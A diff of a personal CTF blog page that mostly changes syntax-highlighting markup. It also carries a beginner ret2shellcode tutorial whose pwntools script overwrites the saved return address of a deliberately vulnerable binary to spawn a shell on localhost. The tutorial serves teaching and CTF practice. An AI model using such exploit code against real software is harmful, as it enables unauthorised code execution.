@@ -147,6 +147,33 @@
 
   <span class="post-date">
     
+    November
+    26th,
+    
+    2023
+  </span>
+
+  <h2>
+    <a href="/writeup/2023/11/26/BlackHat-2024-Quals-CPL0.html">BlackHat 2024 2024 Quals - CPL0</a>
+  </h2>
+
+  <div>
+    
+    
+    <p>I played BlackHat 2024 Qualifiers with <a href="https://team.airoverflow.com/">AirOverflow</a>. I didn’t get much time to play and only managed to solve CPL0.
+The challenge provided a qemu patch and docker container files. I assumed that it was a kernel challenge but it turned out to be very different. Here’s how I solved it: -</p>
+
+    
+    
+  </div>
+
+</article>
+
+
+<article class="home">
+
+  <span class="post-date">
+    
     August
     21st,
     
@@ -180,7 +207,7 @@
   </span>
 
   <h2>
-    <a href="/writeup/2021/09/28/HacktivityCTF2021-pawn-shop.html">HacktivityCTF 2021 pawn shop challenge writeup</a>
+    <a href="/writeup/2021/09/28/HacktivityCTF2021-pawn-shop.html">HacktivityCTF 2021 - Pawn Shop</a>
   </h2>
 
   <div>
@@ -323,7 +350,7 @@ The files can be found <a href="https://github.com/stdnoerr/stdnoerr.github.io/t
 <h1 id="analysis">Analysis</h1>
 <h2 id="code-analysis">Code Analysis</h2>
 <p>Lets take a look at the source code.</p>
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include&lt;stdio.h&gt;
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
 </span>
 <span class="c1">// Compiled with: gcc ret2shellcode.c -o ret2shellcode -z execstack -no-pie -fno-stack-protector </span>
 
@@ -461,84 +488,84 @@ But, for this, we need to have something where we can put it and we need to know
 Luckily, both of these requirements are satisfied in this situation. We have a buffer we can write to and the program gives us its address.<br />
 Lets start writing our exploit script.<br /></p>
 <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
-</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
 	<span class="k">global</span> <span class="n">p</span>
 	<span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
-		<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'localhost'</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
+		<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">localhost</span><span class="sh">'</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
 	<span class="k">else</span><span class="p">:</span>
-		<span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">process</span><span class="p">()</span>
+		<span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="nf">process</span><span class="p">()</span>
 
-<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./ret2shellcode'</span><span class="p">)</span>
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">'</span><span class="s">./ret2shellcode</span><span class="sh">'</span><span class="p">)</span>
 <span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>
-<span class="n">start</span><span class="p">()</span>
+<span class="nf">start</span><span class="p">()</span>
 
 <span class="c1">### Exploit Goes here ###
 </span><span class="n">offset</span> <span class="o">=</span> <span class="mh">0x68</span>
 
-<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
-<span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
 </code></pre></div></div>
 <p>First we need to store buffer’s address which is printed by the binary.</p>
-<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">buf_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">split</span><span class="p">()[</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
+<span class="n">buf_addr</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">().</span><span class="nf">split</span><span class="p">()[</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
 </code></pre></div></div>
 <p>Then the shellcode we want to execute. I used pwntools shellcraft utility for this.</p>
-<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">linux</span><span class="p">.</span><span class="n">sh</span><span class="p">())</span>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">shellcode</span> <span class="o">=</span> <span class="nf">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">linux</span><span class="p">.</span><span class="nf">sh</span><span class="p">())</span>
 </code></pre></div></div>
 <p>Now we need to craft such a payload which will overwrite the RIP with buffer’s address and the buffer contains the shellcode.</p>
 <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># store the shellcode
 </span><span class="n">payload</span> <span class="o">=</span> <span class="n">shellcode</span>
 <span class="c1"># Add junk until we reach saved RIP
-</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="o">*</span><span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="nf">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
 <span class="c1"># Overwrite RIP with buf's address
-</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">)</span>
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">)</span>
 </code></pre></div></div>
 <p>Now just send the payload.</p>
 <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># sendline because gets waits until a newline(\n)
-</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span><span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 </code></pre></div></div>
 <p>Then communicate with the program by going interactive.</p>
-<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
 </code></pre></div></div>
 <p>And BOOM! you have a shell.</p>
 
 <h2 id="final-exploit">Final Exploit</h2>
 <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
-</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
 	<span class="k">global</span> <span class="n">p</span>
 	<span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
-		<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'localhost'</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
+		<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">localhost</span><span class="sh">'</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
 	<span class="k">else</span><span class="p">:</span>
-		<span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">process</span><span class="p">()</span>
+		<span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="nf">process</span><span class="p">()</span>
 
-<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./ret2shellcode'</span><span class="p">)</span>
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">'</span><span class="s">./ret2shellcode</span><span class="sh">'</span><span class="p">)</span>
 <span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>
-<span class="n">start</span><span class="p">()</span>
+<span class="nf">start</span><span class="p">()</span>
 
 <span class="c1">### Exploit Goes here ###
 </span><span class="n">offset</span> <span class="o">=</span> <span class="mh">0x68</span>
 
-<span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">buf_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">split</span><span class="p">()[</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
+<span class="n">buf_addr</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">().</span><span class="nf">split</span><span class="p">()[</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
 
-<span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">linux</span><span class="p">.</span><span class="n">sh</span><span class="p">())</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="nf">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">linux</span><span class="p">.</span><span class="nf">sh</span><span class="p">())</span>
 
 <span class="c1"># store the shellcode
 </span><span class="n">payload</span> <span class="o">=</span> <span class="n">shellcode</span>
 <span class="c1"># Add junk until we reach saved RIP
-</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="o">*</span><span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="nf">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
 <span class="c1"># Overwrite RIP with buf's address
-</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">)</span>
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">)</span>
 
 <span class="c1"># sendline because gets waits until a newline(\n)
-</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span><span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 
-<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
-<span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
 </code></pre></div></div>
 <p>If any of you have any questions/doubts, you can reach out to me on discord (stdnoerr#7880) or on twitter (@stdnoerr).</p>
 
@@ -576,7 +603,7 @@ Lets start writing our exploit script.<br /></p>
 		<footer>
 			<hr/>
 			<p>
-				&copy; 2022 stdnoerr with <a href="http://jekyllrb.com/">Jekyll</a>. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
+				&copy; 2024 stdnoerr with <a href="http://jekyllrb.com/">Jekyll</a>. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
 			</p>
 		</footer>
 	</div>
